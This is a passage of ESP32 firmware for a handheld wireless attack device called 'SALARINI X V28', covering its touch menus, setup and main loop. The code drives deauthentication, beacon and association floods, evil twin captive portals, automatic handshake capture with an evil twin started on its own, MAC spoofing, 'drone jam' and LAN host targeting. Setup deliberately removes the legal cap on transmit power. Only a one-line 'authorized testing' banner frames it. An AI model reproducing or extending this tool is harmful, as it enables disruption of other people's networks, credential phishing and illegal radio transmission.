        if(keyboardPurpose==KEY_ET_PASS){etRealAsked=false;etRealSkipped=true;etRealPass="";keyboardPurpose=KEY_WIFI_PASSWORD;transitionTo(keyboardCancelTo);return;}
        if(keyboardPurpose==KEY_ET_MSG){keyboardPurpose=KEY_WIFI_PASSWORD;transitionTo(keyboardCancelTo);return;}
        transitionTo(CONNECT_WIFI);return;
      }
      if(screen==WIFI_CONNECTING){WiFi.disconnect(false,false);transitionTo(CONNECT_WIFI);return;}
      if(screen==WIFI_DETAILS){transitionTo(CONNECT_WIFI);return;}
      if(screen==CONNECT_WIFI){transitionTo(MAIN);return;}
      if(screen==PORTAL_PICK){Screen backTo=pendingActionReturn;pendingTargetAction=false;pendingTargetActionTitle="";etPendingMode=0;transitionTo(backTo);return;}
      if(screen==MEGA_PICK){transitionTo(COMBO);return;}
      if(screen==AP_RESULTS && wifiConnectMode){wifiConnectMode=false;transitionTo(CONNECT_WIFI);return;}
      if(wifiScanInProgress){
        cancelScan();
        if(pendingTargetAction){Screen backTo=pendingActionReturn;pendingTargetAction=false;pendingTargetActionTitle="";transitionTo(backTo);}
        else transitionTo(wifiConnectMode?CONNECT_WIFI:SCAN);
        return;
      }
      if(visualScanActive){visualScanActive=false;transitionTo(SCAN);return;}
      if(screen==STA_RESULTS){cancelStaScan();transitionTo(SCAN);return;}
      if(screen==STA_SELECT){staSelectConfirm=false;findPickPending=false;transitionTo(SETTINGS);return;}
      if(screen==ATTACK_LIVE){
        if(etActive)stopEvilTwin();else{ae::attackStop();stopBLECarrier();}
        lan::stop();
        droneReleaseAfterAttack();   // V23: stop the drone jam + drop auto link
        smartStage=0;                // V26: aborting the live screen kills SMART
        transitionTo(actionReturnScreen);
        return;
      }
      if(screen==CHANNEL_PICK){pendingChannelAction=CH_ACT_NONE;transitionTo(EXPLOIT);return;}
      if(screen==DISCL){transitionTo(MAIN);return;}
      if(screen==MAIN)return;
      if(screen==PACKET){stopMonitor();transitionTo(MAIN);return;}
      switch(screen){
        case EXPLOIT:transitionTo(MAIN);break;case DEAUTH:transitionTo(EXPLOIT);break;case DEAUTH_APS:transitionTo(DEAUTH);break;
        case AUTH:case ASSOC:case BEACON:case SPOOF:case COMBO:case BT_ADV:transitionTo(EXPLOIT);break;case SCAN:case SCAN_BUSY:case SETTINGS:case ABOUT:transitionTo(MAIN);break;case THEME_PICKER:transitionTo(SETTINGS);break;
        case AP_RESULTS:{
          // V21: BACK respects the calling menu when a target pick is active.
          if(pendingTargetAction){Screen backTo=pendingActionReturn;pendingTargetAction=false;pendingTargetActionTitle="";transitionTo(backTo);}
          else transitionTo(SCAN);
          break;
        }
        case AP_SELECT:{
          // Selection pages confirm (Deauth/Beacon/Spoof/Combo) or plain exit (Settings)
          if(pendingSelectAttack!=ae::AttackType::NONE){
            confirmSelectedAPAttack();
          } else {
            transitionTo(SETTINGS);
          }
          break;
        }
        case POWER:transitionTo(MAIN);break;case BRIGHTNESS:transitionTo(SETTINGS);break;case SD_PAGE:case AUDIO_PAGE:transitionTo(SETTINGS);break;case SD_FILES:transitionTo(SD_PAGE);break;case SD_VIEW:transitionTo(SD_FILES);break;case HELP:transitionTo(SETTINGS);break;case HELP_DETAIL:transitionTo(HELP);break;case IN_NET:transitionTo(CONNECT_WIFI);break;case LAN_HOSTS:transitionTo(IN_NET);break;case DRONE:transitionTo(EXPLOIT);break;default:break;
      }return;
    }
    if(x>=110 && x<210){if(screen==PACKET)stopMonitor();transitionTo(MAIN);return;}
    if(x>=216){
      // CONFIRM pill (replaces the old POWER button) on selection screens.
      if(screen==AP_SELECT && pendingSelectAttack!=ae::AttackType::NONE){confirmSelectedAPAttack();return;}
      if(screen==STA_SELECT && staSelectConfirm){
        // V25: the confirm pill serves the normal STA attacks AND the
        // FIND WIFI device pick (whichever armed the selection screen).
        if(findPickPending) launchFindWifiOnSta();
        else launchSelectedSTAAttack();
        return;
      }
      return;
    }
  }
  // Battery icon always opens power.
  if(y<45 && x>=200){transitionTo(POWER);return;}

  // DISCL: any tap accepts and continues
  if(screen==DISCL){
    if(prefsOK)prefs.putBool("disc",true);
    transitionTo(MAIN);return;
  }
  if(screen==MAIN){
    if(y>=253&&y<299){menuIndex=(x<160)?0:1;openMainAction();return;}
    if(y>=307&&y<353){menuIndex=(x<160)?2:3;openMainAction();return;}
    if(y>=361&&y<407){menuIndex=(x<160)?4:5;openMainAction();return;}
  }
  if(screen==CONNECT_WIFI){
    if(y>=151&&y<197){
      if(apCount>0){wifiConnectMode=true;listTop=0;transitionTo(AP_RESULTS);}
      else beginConnectWifiScan();
      return;
    }
    if(y>=207&&y<253){keyboardPurpose=KEY_WIFI_SSID;keyboardBuffer="";keyboardSymbols=false;keyboardUpper=false;transitionTo(WIFI_KEYBOARD);return;}
    if(y>=263&&y<309){WiFi.disconnect(false,false);drawCurrent();lcdPush(fb);showPopup("WIFI","DISCONNECTED","",1300);return;}
    if(y>=319&&y<365){transitionTo(WIFI_DETAILS);return;}
    if(y>=375&&y<421){transitionTo(IN_NET);return;}
  }
  if(screen==WIFI_KEYBOARD){handleKeyboardTap(x,y);return;}
  if(screen==WIFI_CONNECTING){return;}
  if(screen==PACKET && y>=51&&y<76){
    if(x<107)monitorView=0;else if(x<212)monitorView=1;else monitorView=2;
    drawPacket();lcdPushRect(fb,0,48,TFT_W,385);return;
  }
  if(screen==PACKET && monitorView==2 && y>=81&&y<108){
    monitor5GView=(x>=160);drawPacket();lcdPushRect(fb,0,48,TFT_W,385);return;
  }
  if(screen==HELP && y>=75&&y<405){
    size_t idx=(size_t)listTop+(size_t)((y-75)/47);
    if(idx<HELP_TOPIC_COUNT){helpListTop=listTop;helpSelection=(uint8_t)idx;transitionTo(HELP_DETAIL);return;}
  }
  // V28: HELP pager tap zone removed with the pills (swipe scrolls the list).
  if(screen==HELP_DETAIL && y>=376&&y<417){
    if(x<160)helpSelection=(uint8_t)((helpSelection+HELP_TOPIC_COUNT-1)%HELP_TOPIC_COUNT);
    else helpSelection=(uint8_t)((helpSelection+1)%HELP_TOPIC_COUNT);
    drawHelpDetail();lcdPush(fb);return;
  }
  // ---- Exploit menus (real attacks). Taps map through listTop so scrolled
  // menus (9-item B.T ADV, 9-item DEAUTH) select the row that is shown.
  // V28: PAGE UP / PAGE DOWN pill tap zones REMOVED (the pills are gone).
  // Scrolling is swipe + scrollbar only - one gesture language everywhere.
  if(screen==EXPLOIT && y>=71&&y<407){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)6,menuIndex);openExploitAction();return;}
  if(screen==DEAUTH && y>=71&&y<407){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)8,menuIndex);openDeauthAction();return;}
  if(screen==AUTH && y>=71&&y<215){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)2,menuIndex);openThreeAction(ae::AttackType::AUTH_ALL,ae::AttackType::AUTH_SELECTED,"AUTH ALL APS","AUTH SELECTED APS",CH_ACT_AUTH);return;}
  if(screen==ASSOC && y>=71&&y<215){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)2,menuIndex);openThreeAction(ae::AttackType::ASSOC_ALL,ae::AttackType::ASSOC_SELECTED,"ASSOC ALL APS","ASSOC SELECTED APS",CH_ACT_ASSOC);return;}
  if(screen==BEACON && y>=71&&y<407){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)6,menuIndex);openBeaconAction();return;}
  if(screen==SPOOF && y>=71&&y<407){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)4,menuIndex);openSpoofAction();return;}
  if(screen==COMBO && y>=71&&y<407){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)8,menuIndex);openComboAction();return;}
  if(screen==DRONE && y>=71&&y<407){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)8,menuIndex);openDroneAction();return;}
  if(screen==BT_ADV && y>=71&&y<407){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)8,menuIndex);openBTAction();return;}
  if(screen==IN_NET && y>=71&&y<407){menuIndex=(uint8_t)(listTop+(y-71)/48);menuIndex=min((uint8_t)6,menuIndex);openInNetAction();return;}
  // ---- Live attack screen: FIND WIFI rows (confirm / skip); otherwise no
  // tap targets. BACK exits the attack. ----
  if(screen==ATTACK_LIVE){
    if(ae::attackType()==ae::AttackType::FIND_WIFI && ae::attackRunning() && y>=STAGE_Y+134 && y<STAGE_Y+134+4*50){
      const int y0=STAGE_Y+134,rowH=50;
      size_t shown=0;
      size_t n=ae::findCount();
      for(size_t i=0;i<n && shown<4;i++){
        const ae::FindNet *f=ae::findNetAt(i);
        if(!f||f->skipped) continue;
        int ry=y0+(int)shown*rowH;
        shown++;
        if(y<ry || y>=ry+44) continue;
        if(x>=250){
          // "ESE ES" - mark the network and end the hunt
          ae::findConfirm(i);
          String nm=f->hasSsid?displaySSID(String(f->ssid),20):macToString(f->bssid);
          ae::attackStop();
          droneReleaseAfterAttack();
          showPopup("FIND WIFI","THEIR WIFI: "+nm,"SEARCH MARKED + STOPPED",2600);
          transitionTo(actionReturnScreen);
        }else{
          // "PASE AL SIGUIENTE" - never consider this one again
          ae::findSkip(i);
          showPopup("FIND WIFI","SKIPPED","KEEPING THE SEARCH",1200);
        }
        return;
      }
    }
    return;
  }
  // ---- Channel picker ----
  if(screen==CHANNEL_PICK && y>=68&&y<68+(int)((PICK_CHANNEL_COUNT+4)/5)*40){
    int col=x>=12?(int)((x-12)/60):-1;
    if(col>=0&&col<5){
      int row=(int)(y-68)/40;
      int idx=row*5+col;
      if(idx>=0&&idx<(int)PICK_CHANNEL_COUNT){
        uint8_t ch=PICK_CHANNELS[idx];
        ChannelAction act=pendingChannelAction;
        pendingChannelAction=CH_ACT_NONE;
        launchChannelAttack(act,ch);
        return;
      }
    }
    return;
  }
  // ---- Station results (live): tap row = popup info, CLEAR pill wipes ----
  if(screen==STA_RESULTS){
    if(x>=256&&y>=44&&y<70){ae::clearSTAs();drawCurrent();lcdPush(fb);return;}
    if(y>=70&&y<406){size_t i=listTop+(size_t)((y-70)/48);if(i<ae::staCount()){ae::STAInfo *s=ae::staAt(i);if(s){int api=ae::findKnownAP(s->ap);uint32_t ageS=(millis()-s->lastSeen)/1000UL;showPopup("STATION",macToString(s->sta),String((unsigned long)s->pkts)+" PKTS  "+String(s->rssi)+"dBm  "+String(ageS)+"s AGO",1600);}return;}}
    return;
  }
  // ---- Station select: toggle rows or confirm ----
  if(screen==STA_SELECT){
    int listBottom=406;
    if(y>=70&&y<listBottom){size_t i=listTop+(size_t)((y-70)/48);if(i<ae::staCount()&&i<MAX_STA_SEL){selectedSTA[i]=!selectedSTA[i];drawCurrent();lcdPush(fb);return;}}
    return;
  }
  // ---- LAN hosts (IN-NET): tap row = set attack target ----
  if(screen==LAN_HOSTS){
    if(y>=71&&y<406){
      size_t i=listTop+(size_t)((y-71)/48);
      const lan::LanHost *h=lan::hostAt(i);
      if(h){
        lan::setTarget(h->ip,h->port,h->ip.c_str());
        showPopup("TARGET SET",h->ip+":"+String(h->port),"NOW START AN ATTACK",1600);
      }
    }
    return;
  }

  if(screen==SCAN){
    if(y>=150&&y<206){beginScanAPs();return;}
    if(y>=216&&y<272){beginStaScan();return;}
    if(y>=282&&y<340){startMonitor();transitionTo(PACKET);return;}
  }
  if(screen==AP_RESULTS){
    if(y>=54&&y<420){size_t i=listTop+(y-54)/52;if(i<apCount){
      if(pendingTargetAction){
        pendingTargetAction=false;pendingTargetActionTitle="";
        wifiConnectMode=false;
        uint8_t mode=etPickMode; etPickMode=0;
        launchTargetedMode(mode,i);
        return;
      }
      if(wifiConnectMode){
        wifiTargetSSID=aps[i].ssid;wifiPassword="";
        if(aps[i].encrypted){keyboardPurpose=KEY_WIFI_PASSWORD;keyboardBuffer="";keyboardSymbols=false;keyboardUpper=false;transitionTo(WIFI_KEYBOARD);}
        else startWifiConnection(wifiTargetSSID,"");
        return;
      }
      showPopup("AP",displaySSID(aps[i].ssid,30),String(aps[i].rssi)+" dBm CH "+String(aps[i].channel)+" "+bandForChannel(aps[i].channel),1500);return;
    }}
  }
  if(screen==AP_SELECT){
    if(y>=54&&y<420){size_t i=listTop+(y-54)/52;if(i<apCount){selectedAP[i]=!selectedAP[i];drawCurrent();lcdPush(fb);return;}}
  }
  // ---- V21 MEGA EVIL TWIN mode picker ----
  if(screen==MEGA_PICK){
    if(y>=74&&y<150)openMegaMode(7);
    else if(y>=158&&y<234)openMegaMode(8);
    else if(y>=242&&y<318)openMegaMode(6);
    return;
  }
  if(screen==PORTAL_PICK){
    if(y>=70&&y<70+7*44){
      size_t i=(size_t)listTop+(size_t)((y-70)/44);
      if(i<etTmplCount){
        etTemplate=(uint8_t)i;
        launchPendingEvilTwin();
      }
    }
    return;
  }
  if(screen==SETTINGS){
    if(y>=52&&y<422){
      int si=((int)y-52)/37;
      int rowY=52+si*37;
      if(si>=0&&si<10&&y<rowY+33){
        switch(si){
          case 0: if(apCount==0){scanThenSelect=true;beginScanAPs();}else{pendingSelectAttack=ae::AttackType::NONE;pendingSelectTitle="";transitionTo(AP_SELECT);}return;
          case 1: if(ae::staCount()>0){staSelectConfirm=false;listTop=0;transitionTo(STA_SELECT);}else beginStaScan();return;
          case 2: transitionTo(BRIGHTNESS);return;
          case 3: rot180=!rot180;lcdSetRotation(rot180);if(prefsOK)prefs.putBool("rot",rot180);drawCurrent();lcdPush(fb);return;
          case 4: {int lv=(int)ae::powerLevel();lv=(lv+1)%3;ae::setPowerLevel((ae::Power)lv);if(prefsOK)prefs.putUChar("pwrlvl",(uint8_t)lv);drawCurrent();lcdPush(fb);}return;
          case 5: {
            // V28 AIR PAIR: switching DUAL MODE ON announces it over the air -
            // the drone listens on ch 1 whenever it is IDLE and answers with
            // its pair code; a success popup fires from loop() and the 3-wire
            // AUTO-PIN transport is kicked automatically. Wire link beats it.
            dualModeOn=!dualModeOn;
            if(prefsOK)prefs.putBool("dualon",dualModeOn);
            if(!dualModeOn){
              droneReleaseAfterAttack();
            } else if(!drone::linked()){
              if(macBusy())              showPopup("DUAL AIR PAIR","RADIO BUSY","PAIR AFTER YOU EXIT",1800);
              else if(!drone::airPairStart()) showPopup("DUAL AIR PAIR","RADIO NOT READY","DISCONNECT WIFI FIRST",1800);
              else                       showPopup("DUAL AIR PAIR","CALLING THE DRONE","12S ON CHANNEL 1",1500);
            }
            drawCurrent();lcdPush(fb);return;
          }
          case 6: transitionTo(THEME_PICKER);return;
          case 7: transitionTo(SD_PAGE);return;
          case 8: transitionTo(HELP);return;
          case 9: transitionTo(POWER);return;
        }
      }
    }
    return;
  }
  if(screen==SD_PAGE){
    if(y>=135&&y<189){sdMounted=sdMountCard();if(sdMounted){sdRefreshFiles();drawCurrent();lcdPush(fb);showPopup("SD CARD","MOUNTED","CARD READY");}else showPopup("SD CARD","MOUNT FAILED","CHECK FAT32 / INSERTION");return;}
    if(y>=199&&y<253){if(!sdMountCard()){showPopup("SD CARD","NO CARD","MOUNT THE CARD FIRST");return;}sdRefreshFiles();sdListTop=0;transitionTo(SD_FILES);return;}
    if(y>=263&&y<317){if(sdWriteStatusLog()){sdRefreshFiles();drawCurrent();lcdPush(fb);showPopup("SD CARD","STATUS LOG SAVED","/SALARINI_STATUS.TXT",1700);}else showPopup("SD CARD","WRITE FAILED","MOUNT CARD FIRST");return;}
    if(y>=327&&y<381){if(sdMounted){digitalWrite(LCD_CS,HIGH);SD.end();digitalWrite(LCD_CS,HIGH);sdMounted=false;sdFileCount=0;}showPopup("SD CARD","EJECTED SAFELY","",1300);drawCurrent();lcdPush(fb);return;}
  }
  if(screen==SD_FILES){
    if(y>=76&&y<394){size_t idx=sdListTop+(size_t)((y-76)/53);if(idx<sdFileCount){
      if(sdFileDirs[idx]){
        // V20 file manager: navigate into subdirectories (".." climbs up).
        if(sdFilePaths[idx]=="/"){
          if(sdCurDir=="/")return;
          int cut=sdCurDir.lastIndexOf('/');
          sdCurDir=(cut<=0)?"/":sdCurDir.substring(0,cut);
        }else{
          sdCurDir=sdFilePaths[idx];
        }
        sdListTop=0;sdRefreshFiles();drawCurrent();lcdPush(fb);return;
      }
      String path=sdFilePaths[idx];if(sdLoadTextFile(path)){transitionTo(SD_VIEW);}else showPopup("FILE VIEWER","CANNOT READ FILE","BINARY OR EMPTY FILE");return;
    }}
  }
  if(screen==SD_VIEW){
    // V20: delete the file currently being viewed.
    if(y>=394&&y<426&&x>=70&&x<250){
      if(sdMounted && sdViewTitle.length()>0 && sdViewTitle!="/"){
        if(SD.remove(sdViewTitle.c_str())){
          showPopup("FILE MANAGER","DELETED",sdViewTitle,1500);
          sdRefreshFiles();
          transitionTo(SD_FILES);
        }else showPopup("FILE MANAGER","DELETE FAILED","FILE MAY BE OPEN");
      }
      return;
    }
  }
  if(screen==AUDIO_PAGE){
    if(y>=168&&y<211){speakerVolume=(uint8_t)constrain((int)lroundf((float)(x-28)*100.0f/264.0f),0,100);speakerMuted=false;setSpeakerVolumeRegister();drawCurrent();lcdPush(fb);return;}
    if(y>=226&&y<276){if(x<105){speakerVolume=(uint8_t)max(0,(int)speakerVolume-10);speakerMuted=false;setSpeakerVolumeRegister();drawCurrent();lcdPush(fb);return;}if(x<215){bool ok=speakerTestTone();drawCurrent();lcdPush(fb);if(!ok)showPopup("SPEAKER","AUDIO INIT FAILED","CHECK CODEC / I2S");return;}speakerVolume=(uint8_t)min(100,(int)speakerVolume+10);speakerMuted=false;setSpeakerVolumeRegister();drawCurrent();lcdPush(fb);return;}
    if(y>=289&&y<340){speakerMuted=!speakerMuted;if(speakerEnsureReady())setSpeakerVolumeRegister();if(prefsOK){prefs.putUChar("vol",speakerVolume);prefs.putBool("mute",speakerMuted);}drawCurrent();lcdPush(fb);return;}
    if(y>=353&&y<405){bool ok=speakerTestTone();drawCurrent();lcdPush(fb);if(!ok)showPopup("SPEAKER","AUDIO INIT FAILED","CHECK CODEC / I2S");return;}
  }
  if(screen==THEME_PICKER){
    if(y>=52 && y<52+(int)THEME_COUNT*56){
      int rel=(int)y-52;uint8_t idx=(uint8_t)(rel/56);
      if(idx<THEME_COUNT && (rel%56)<48){applyTheme(idx,true);drawThemePicker();lcdPush(fb);}
      return;
    }
  }
  if(screen==BRIGHTNESS){
    if(y>=145&&y<220){applyBrightness(brightnessFromTouch(x));drawCurrent();lcdPush(fb);return;}
    if(y>=242&&y<292){if(x<105)applyBrightness((int)brightness-10);else if(x<210)applyBrightness((int)brightness+10);else applyBrightness(100);drawCurrent();lcdPush(fb);return;}
  }
}

static bool touchDown=false; static uint16_t downX=0,downY=0,lastX=0,lastY=0; static uint32_t downMs=0; static int brightnessTouchLast=-1;
static void handleTouch(){
  uint16_t x=0,y=0; bool d=touchRead(x,y);
  if(introTouchHeld){if(!d){introTouchHeld=false;touchDown=false;}return;}
  if(d && screen==INTRO){introTouchHeld=true;transitionTo(disclaimerAccepted?MAIN:DISCL);return;}
  if(d){
    if(!touchDown){touchDown=true;downX=x;downY=y;downMs=millis();brightnessTouchLast=-1;}
    lastX=x;lastY=y;
    if(screen==BRIGHTNESS && y>=145 && y<225){
      int live=brightnessFromTouch(x);
      if(live!=brightnessTouchLast){brightnessTouchLast=live;applyBrightness(live);drawCurrent();lcdPush(fb);}
    }
    return;
  }
  if(!touchDown)return;
  touchDown=false;
  int dx=(int)lastX-(int)downX,dy=(int)lastY-(int)downY; uint32_t dt=millis()-downMs;
  const int adx=abs(dx), ady=abs(dy);
  if(popup){closePopup();return;}
  // V26 SCROLL FIX ("el menu no lo puedo bajar en los ataques"): the old
  // classifier had a DEAD ZONE - a swipe between 30 and 45 px (and any
  // slightly diagonal swipe) hit NEITHER the tap branch NOR the scroll
  // branch, so short natural flicks did literally nothing. New rules:
  //   tap     = finger moved < 26 px and released within 0.9 s
  //   scroll  = any vertical intent (ady > 26 px and steeper than wide)
  //   one row per 40 px, minimum one - a 27 px flick still moves the list.
  // V27: on list screens the tap window shrinks to 14 px - a small vertical
  // drag is a SCROLL attempt, not a tap, so trying to scroll can no longer
  // fire the attack row under the finger. Other screens keep the classic
  // 26 px rule. Scroll intent also drops from 26 px to 14 px on lists:
  // short natural flicks now move the list (WiFi-list feel).
  const bool lsList=listScreen();
  const int  tapTol=lsList?14:26;
  if(adx<tapTol&&ady<tapTol&&dt<900){handleTap(downX,downY);return;}
  if(lsList && ady>14 && ady>adx){
    size_t n=screenCount(); if(n){
      int step=max(1,ady/40);
      if(screen==SD_FILES){
        if(dy<0){ int maxTop=(int)max(0,(int)sdFileCount-6); sdListTop=(size_t)constrain((int)sdListTop+step,0,maxTop); }
        else { sdListTop=(size_t)constrain((int)sdListTop-step,0,(int)max(0,(int)sdFileCount-1)); }
      }else{
        if(dy<0) listTop=(uint8_t)min((int)listTop+step,(int)max(0,(int)n-7));
        else     listTop=(uint8_t)max(0,(int)listTop-step);
      }
      drawCurrent();lcdPush(fb);
    }
    return;
  }
  // A horizontal or tiny-but-slow gesture that is not a tap: fall through
  // silently (was: dead zone). Nothing to do on these screens for it.
}

// ------------------------------ Setup --------------------------------
static void loadPrefs(){
  prefsOK=prefs.begin("salarini-v14",false);
  if(!prefsOK)return;
  brightness=constrain((int)prefs.getUChar("br",100),0,100);
  speakerVolume=constrain((int)prefs.getUChar("vol",45),0,100);
  speakerMuted=prefs.getBool("mute",false);
  rot180=prefs.getBool("rot",false);
  disclaimerAccepted=prefs.getBool("disc",false);
  ae::setPowerLevel((ae::Power)constrain((int)prefs.getUChar("pwrlvl",1),0,2));
  dualModeOn=prefs.getBool("dualon",false);   // V23.2 DUAL MODE (saved switch)
  themeIndex=constrain((int)prefs.getUChar("theme",0),0,(int)THEME_COUNT-1);
  applyTheme(themeIndex,false);
}

void setup(){
  Serial.begin(115200);
  delay(200);
  setCpuFrequencyMhz(240);   // maximum CPU clock: smooth UI + fastest TX
  Serial.println();Serial.println("=== SALARINI X V28 (DUAL AIR PAIR + EVIL TWIN CAPTIVE POPUP ALL OS + PAGER PILLS REMOVED + SMART ATTACK + MAC SPOOF + FIND WIFI + AUTO-PIN LINK + TX UNLEASHED) ===");
  Serial.println("=== AUTHORIZED SECURITY TESTING ONLY ===");
  Serial.printf("[DUAL] mode %s - every Wi-Fi attack pulls the SX-DRONE in\n",dualModeOn?"ON":"OFF");
  drone::begin();   // V24.1: open the TX/RX link port + log the wiring early
  Serial.printf("Flash: %lu MB  PSRAM: %s %lu MB\n",(unsigned long)(ESP.getFlashChipSize()/1024/1024),psramFound()?"YES":"NO",(unsigned long)(ESP.getPsramSize()/1024/1024));

  pinMode(TOUCH_INT,INPUT_PULLUP);
  Wire.begin(I2C_SDA,I2C_SCL,I2C_FREQ);
  loadPrefs();

  bool chOK=chInit();Serial.printf("[CH32] %s\n",chOK?"OK":"FAIL");
  pmuInit();pmuUpdate();

  if(!chOK){Serial.println("[LCD] CH32 init failed; continuing for diagnostics");}
  lcdInit();
  pinMode(SD_CS,OUTPUT);digitalWrite(SD_CS,HIGH);
  lcdSetRotation(rot180);
  boardBacklight(brightness);

  Wire.setClock(I2C_FREQ);
  Wire.beginTransmission(FT6336_ADDR); const bool ftOK=(Wire.endTransmission()==0);
  Serial.printf("[FT6336] %s\n",ftOK?"OK":"FAIL");

  WiFi.mode(WIFI_STA); WiFi.setSleep(false); WiFi.disconnect(false,true);
  // V26: same safe band order the drone got - the C5 only defines
  // esp_wifi_set_band_mode() BEFORE the driver runs (the drone's field
  // CPU_LOCKUP loop proved the hard way). Start, stop, set band, start.
  esp_wifi_stop();
  esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
  esp_wifi_start();
  WiFi.setSleep(false);
  ae::unleashTx();               // V23.1: TX power UNLEASHED for the whole session (no legal cap, main + drone)
  macStoreOriginal();            // V26: keep the factory MAC for MAC RESTORE
  pmuUpdate();
  Serial.printf("[PMU] batt=%s %d%% %umV source=%s VBUS=%s %umV charge=%s gauge=%d%%\n",batPresent?"YES":"NO",batPercent,batMv,batPercentSource,vbusPresent?"YES":"NO",vbusMv,batCharging?"YES":"NO",batGaugePercent);
  homeAnimEpochMs=millis();homeAnimLastFrameMs=millis();
  screen=INTRO;introStartMs=millis();introLastFrameMs=0;introTouchHeld=false;
  drawIntroBase();drawIntroFrame(0);lcdPush(fb);
}

void loop(){
  static uint32_t lastPMU=0,lastUI=0,lastPowerTelemetry=0;
  uint32_t now=millis();

  serviceIntroAnimation();
  serviceScan();
  serviceWifiConnection();
  serviceEvilTwin();

  // Real attack + BLE + LAN services (merged Nova X engine + IN-NET suite)
  ae::service();
  ae::staScanService();
  ble::service();
  drone::service();   // V23 DUO: keepalive + status poll + auto re-link
  drone::airPairService();   // V28 AIR PAIR: DUAL MODE announce window
  // V28: consume the AIR PAIR result once - popup + kick the wire link.
  {
    int apr = drone::airPairResult();
    if(apr == 1){
      char cd[8]; snprintf(cd, sizeof(cd), "%04X", (unsigned)drone::airCode());
      showPopup("DUAL AIR PAIR","DRONE PAIRED (" + String(cd) + ")","STARTING LINK...",2000);
      drone::linkStart();          // AUTO-PIN wire hunt right away
    } else if(apr == 2){
      showPopup("DUAL AIR PAIR","NO DRONE HEARD","DRONE IDLE + IN RANGE?",2600);
    }
  }
  lan::service();
  serviceAttackLive();
  serviceSmart();     // V26 SMART ATTACK: handshake watch + auto evil twin

  // Sample the AXP2101 often, but update only the header / power telemetry regions.
  // The native AXP2101 fuel-gauge percentage remains the authoritative percentage.
  if(now-lastPMU>=250){
    lastPMU=now;
    pmuUpdate();
    if(!popup && screen!=INTRO && screen!=SCAN_BUSY){
      header(activeHeaderTitle);
      lcdPushRect(fb,0,0,TFT_W,48);
      if(screen==POWER){
        drawPowerBatteryPanel();
        lcdPushRect(fb,10,160,300,68);
        if(now-lastPowerTelemetry>=500){
          lastPowerTelemetry=now;drawPowerTelemetry();lcdPushRect(fb,10,236,300,178);
        }
      }
    }
  }

  if(screen==PACKET){updateMonitor();if(now-lastUI>=220){lastUI=now;drawPacket();lcdPushRect(fb,0,48,TFT_W,385);}}
  if(popup && now>=popupUntil){popup=false;drawCurrent();lcdPush(fb);}
  serviceHomeAnimation();
  handleTouch();
  delay(3);
}
